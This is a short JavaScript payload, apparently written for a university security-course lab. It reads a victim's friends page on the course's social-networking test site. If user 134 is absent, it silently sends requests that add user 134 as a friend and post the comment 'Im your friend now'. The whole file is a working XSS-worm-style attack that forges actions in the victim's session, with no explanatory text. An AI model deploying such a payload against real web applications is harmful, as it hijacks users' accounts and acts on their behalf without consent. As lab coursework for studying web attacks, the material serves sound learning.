function moveitmoveit() {
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    var friend = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
        success: function(data) {
            return data;
        }
    });
    var eff = friend.responseText;
    alert(eff);
    var arr= eff.match('^[^<br]*').join().split(',');
    for( var i = 0; i < arr.length; i++){
        alert(arr[i]);
    }
    if(eff.match('134') == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 134});
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 134,comment: 'Im your friend now'});
    }
}
moveitmoveit();
